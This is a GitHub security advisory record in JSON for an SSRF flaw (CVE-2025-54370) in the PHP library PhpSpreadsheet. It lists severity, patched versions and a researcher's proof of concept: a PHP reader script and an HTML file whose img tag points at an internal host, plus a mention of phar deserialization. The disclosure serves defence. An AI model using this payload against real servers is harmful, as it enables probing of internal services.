{
  "Severity": "HIGH",
  "UpdatedAt": "2025-08-25T14:32:34Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "phpoffice/phpspreadsheet"
  },
  "Advisory": {
    "DatabaseId": 308820,
    "Id": "GSA_kwCzR0hTQS1yeDdtLTY4dmMtcHB4aM4ABLZU",
    "GhsaId": "GHSA-rx7m-68vc-ppxh",
    "References": [
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-rx7m-68vc-ppxh"
      },
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/commit/334a67797ace574d1d37c0992ffe283b7415471a"
      },
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/commit/4050f14521d70634c3320b170236574a6106eb39"
      },
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/commit/81a0de2261f698404587a6421a5c6eb263c40b31"
      },
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/commit/ac4befd2f7ccc21a59daef606a02a3d1828ade09"
      },
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/commit/c2cd0e64392438e4c6af082796eb65c1d629a266"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54370"
      },
      {
        "Url": "https://github.com/FriendsOfPHP/security-advisories/blob/master/phpoffice/phpspreadsheet/CVE-2025-54370.yaml"
      },
      {
        "Url": "https://github.com/advisories/GHSA-rx7m-68vc-ppxh"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-rx7m-68vc-ppxh"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-54370"
      }
    ],
    "Description": "**Product:** PhpSpreadsheet\n**Version:** 3.8.0\n**CWE-ID:** CWE-918: Server-Side Request Forgery (SSRF)\n**CVSS vector v.3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)\n**CVSS vector v.4.0:** 8.7 (AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)\n**Description:** SSRF occurs when a processed HTML document is read and displayed in the browser\n**Impact:** Server-Side Request Forgery\n**Vulnerable component:** the `PhpOffice\\PhpSpreadsheet\\Worksheet\\Drawing` class, `setPath` method\n**Exploitation conditions:** getting a string from the user that is passed to the HTML reader\n**Mitigation:** improved processing of the `$path` variable of the `setPath` method of the `PhpOffice\\PhpSpreadsheet\\Worksheet\\Drawing` class is needed\n**Researcher: Aleksey Solovev (Positive Technologies)**\n\n# Research\nThe researcher discovered zero-day vulnerability Server-Side Request Forgery (SSRF) (in the `setPath` method of the `PhpOffice\\PhpSpreadsheet\\Worksheet\\Drawing` class) in Phpspreadsheet.\nThe latest version (3.8.0) of the `phpoffice/phpspreadsheet` library was installed. Below are the details of the installation:\n\n*Listing 1. Installing the phpoffice/phpspreadsheet library*\n```\n$ composer require phpoffice/phpspreadsheet --prefer-source\n```\nThe code that processes the HTML string with further rendering and displaying the result in the browser.\n*Listing 2. Executable file index.php using the PhpSpreadsheet library*\n```\n\u003c?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileType = 'Html';\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);  \n\n\n$inputFileName = './doc/file.html';\n$spreadsheet = $reader-\u003eload($inputFileName); \n\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet); \nprint($writer-\u003egenerateHTMLAll());\n```\n\nAlso, the `./doc/file.html` has the following content: the `img` tag with the `src` attribute, which contains the value `http:// 127.0.0.1:1337`\n\n*Listing 3. The ./doc/file.html file*\n```\n\u003ctable\u003e\n    \u003ctr\u003e\n        \u003cimg src=\"http://127.0.0.1:1337\"\u003e\n    \u003c/tr\u003e\n\u003c/table\u003e\n```\nThe vulnerability lies in the `setPath` method of the `PhpOffice\\PhpSpreadsheet\\Worksheet\\Drawing` class.\n \nFigure 1. The `PhpOffice\\PhpSpreadsheet\\Worksheet\\Drawing` class, `setPath` method.\n\n![fig1](https://github.com/user-attachments/assets/75433f59-fac6-46d5-bcfd-6d0174bfcedd)\n\nFigure 2 below demonstrates the SSRF vulnerability exploitation.\n\n![fig2](https://github.com/user-attachments/assets/3601692b-b077-420f-a2fb-8af0b66b6475)\n\nFigure 2. Demonstration of the SSRF vulnerability exploitation\n\nAlso, there is code on line 154 that could potentially be used by an attacker to perform unsafe deserialization via the `phar` archive and the `file_exists` method.\n \nFigure 3. Opportunity to perform phar deserialization\n![fig3](https://github.com/user-attachments/assets/3d7d4fc2-1b89-4925-82fa-e21c773efd47)\n\n_____________________________________________\n\nPlease, assign all credits to: Aleksey Solovev (Positive Technologies)\n\n# Credit\n\nAleksey Solovev (Positive Technologies)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-08-25T14:32:32Z",
    "Severity": "HIGH",
    "Summary": "PhpSpreadsheet vulnerable to SSRF when reading and displaying a processed HTML document in the browser",
    "UpdatedAt": "2025-08-29T21:09:01Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "5.0.0"
      },
      "VulnerableVersionRange": "\u003e= 4.0.0, \u003c 5.0.0"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "3.10.0"
      },
      "VulnerableVersionRange": "\u003e= 3.0.0, \u003c 3.10.0"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "2.4.0"
      },
      "VulnerableVersionRange": "\u003e= 2.2.0, \u003c 2.4.0"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "2.1.12"
      },
      "VulnerableVersionRange": "\u003e= 2.0.0, \u003c 2.1.12"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "1.30.0"
      },
      "VulnerableVersionRange": "\u003c 1.30.0"
    }
  ]
}